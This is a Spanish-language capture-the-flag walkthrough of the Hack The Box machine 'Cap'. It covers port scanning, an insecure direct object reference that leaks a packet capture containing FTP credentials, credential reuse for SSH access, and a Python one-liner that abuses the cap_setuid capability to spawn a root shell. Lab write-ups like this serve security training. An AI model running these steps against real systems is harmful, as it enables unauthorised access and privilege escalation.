---
title: Cap (Hack The Box)
author: J0lm3d0
date: 2021-10-02 21:00:00 +0200
categories: [HackTheBox]
tags: [linux, idor, pcap, capabilities]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina Cap de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.

![Logo de la máquina](/assets/img/HTB/Cap/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_Cap.pdf)

## Enumeración de servicios y recopilación de información sensible

Para comenzar, realizo un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```bash
# nmap -p- --open -T5 -n -vv 10.10.10.245

Not shown: 65532 closed ports
Reason: 65532 resets
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```bash
# nmap -p 21,22,80 -sC -sV 10.10.10.245

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Mon, 05 Jul 2021 17:57:03 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 05 Jul 2021 17:56:57 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 05 Jul 2021 17:56:57 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=7/5%Time=60E347E9%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,105F,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20M
SF:on,\x2005\x20Jul\x202021\x2017:56:57\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201938
SF:6\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\n
SF:\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20
SF:<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x
SF:20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\x
SF:20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1
SF:\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image/
SF:png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<l
SF:ink\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">\
SF:n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/font
SF:-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=\
SF:"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.c
SF:ss\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/cs
SF:s/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOptions
SF:,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Mon,\x20
SF:05\x20Jul\x202021\x2017:56:57\x20GMT\r\nConnection:\x20close\r\nContent
SF:-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x20
SF:HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text/
SF:html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20\
SF:x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\n
SF:\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invalid
SF:\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP/
SF:1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189,
SF:"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20Mo
SF:n,\x2005\x20Jul\x202021\x2017:57:03\x20GMT\r\nConnection:\x20close\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\r
SF:\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20F
SF:inal//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\
SF:n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20serv
SF:er\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20che
SF:ck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Al encontrarse abiertos los puertos 21, 22 y 80, y no contar con ningunas credenciales para los servicios FTP o SSH, comienzo a enumerar el servidor web. En la siguiente imagen se puede ver el panel de la página principal, en el cual vemos algunas gráficas y 3 diferentes opciones en el menú de la parte izquierda.

![Página principal del servidor web](/assets/img/HTB/Cap/dashboard.png)

Al acceder a las diferentes opciones de arriba a abajo, nos aparecen las páginas que se observan en las siguientes capturas:

![Página "data" del servidor web](/assets/img/HTB/Cap/ssnapshot.png)

![Página "ip" del servidor web](/assets/img/HTB/Cap/ipconfig.png)

![Página "netstat" del servidor web](/assets/img/HTB/Cap/netstat.png)

Con la información recopilada hasta el momento, no puedo conseguir acceso a la máquina, por lo que procedo a realizar una búsqueda de directorios y archivos utilizando fuerza bruta mediante la herramienta `Gobuster`:

```
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -u http://10.10.10.245

/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
/ip                   (Status: 200) [Size: 17380]                         
/netstat              (Status: 200) [Size: 44706]                         
/capture              (Status: 302) [Size: 222] [--> http://10.10.10.245/data/18]
```

Al ver el resultado, me doy cuenta de que la ruta "capture" es aquella a la que nos redirige al clicar en la opción "Secure Snapshot" del sitio web y que, cada petición que se realiza, el número que aparece después de la ruta "data" cambia. Por tanto, pruebo a realizar fuzzing con un diccionario de números mediante `WFuzz` en la ruta "data", para así comprobar si hay alguna ruta cuyo contenido sea diferente.

![Realizamos fuzzing con diferentes números sobre el directorio "data"](/assets/img/HTB/Cap/fuzzing.png)

Veo que el tamaño de las páginas es prácticamente similar en todas las rutas, por lo que decido ir probando una a una. Ya en la ruta número 0, veo que el valor que se muestra de número de paquetes no es 0, por lo que procedo a descargar el fichero para ver su contenido.

![Página "data/0" del servidor web](/assets/img/HTB/Cap/ssnapshot0.png)

Al revisar con Wireshark el fichero .pcap descargado, encuentro una conexión al servidor FTP en la que se muestran las credenciales utilizadas.

![Obtenemos las credenciales de FTP en la captura descargada](/assets/img/HTB/Cap/wireshark.png)

## Acceso a la máquina

Con las credenciales obtenidas en la captura, logro conectarme correctamente al servidor FTP y ver su contenido.

```
# ftp 10.10.10.245

Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:j0lm3d0): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 1001     1001         4096 Oct 01 16:07 libnss_x
-rwxr-xr-x    1 1001     1001       476162 Oct 01 13:52 linpeas.sh
-rw-rw-r--    1 1001     1001        78576 Oct 01 13:58 linpeas.txt
-rw-rw-r--    1 1001     1001            0 Oct 01 14:02 login.sh
drwxrwxr-x    2 1001     1001         4096 Oct 01 16:35 script
drwxr-xr-x    3 1001     1001         4096 Oct 01 13:56 snap
-rwxrwxr-x    1 1001     1001         1002 Oct 01 16:47 susechfn.sh
-rw-rw-r--    1 1001     1001         2396 Oct 01 16:49 test.c
drwxrwxr-x    3 1001     1001         4096 Oct 01 19:04 tmp
-r--------    1 1001     1001           33 Oct 01 12:58 user.txt
226 Directory send OK.
ftp> dir script
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1001     1001           75 Oct 01 16:24 demo.c
-rwsrwxr-x    1 1001     1001        16784 Oct 01 16:24 shell
226 Directory send OK.
ftp> dir snap
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 1001     1001         4096 Oct 01 13:56 lxd
226 Directory send OK.
ftp> dir libnss_x
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxr-x    1 1001     1001        14000 Oct 01 16:07 x.so.2
226 Directory send OK.
ftp> dir tmp
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1001     1001          264 Oct 01 16:17 Makefile
-rw-rw-r--    1 1001     1001         1994 Oct 01 16:17 brute.sh
-rw-rw-r--    1 1001     1001         4420 Oct 01 16:16 hax.c
-rw-rw-r--    1 1001     1001          407 Oct 01 16:16 lib.c
drwxrwxr-x    2 1001     1001         4096 Oct 01 16:17 libnss_X
-rwxrwxr-x    1 1001     1001        17336 Oct 01 16:17 sudo-hax-me-a-sandwich
226 Directory send OK.

```

Una vez dentro, me descargo todos los archivos y visualizo el contenido de la flag "user.txt".

```
# cat user.txt

b9b5a051d88a0dc1eb5ad222768e1df2b
```

También pruebo a reutilizar las credenciales de la conexión por FTP para intentar conectarme por SSH. Tras la prueba, veo que puedo conectarme correctamente, obteniendo así una sesión remota en la máquina víctima.

## Escalada de privilegios

Los archivos "log.log" y "log2" que vimos en el servidor FTP contienen la salida del script LinPEAS (imagino que tras ejecutarlo en la máquina víctima). Tras revisarlos detenidamente, veo que en el fichero "log2" aparecen unas capabilities que podrían servirnos para escalar privilegios.

![Capabilities descubiertas por el script LinPEAS](/assets/img/HTB/Cap/capabilitieslog2.png)

Por tanto, trato de verificar si esas capabilities que aparecen en el log corresponden a las de la máquina víctima. Compruebo que, efectivamente, las capabilities del log son similares a las que obtengo mediante getcap, por lo que me aprovecho de la capabilitie "cap\_setuid" de Python 3.8 para convertirme en el usuario root y visualizar la flag final.

```
nathan@cap:~$ getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid, cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_raw+ep

nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

root@cap:~# cat /root/root.txt

7df8eeedd7150c8659d5ea3850680854
```
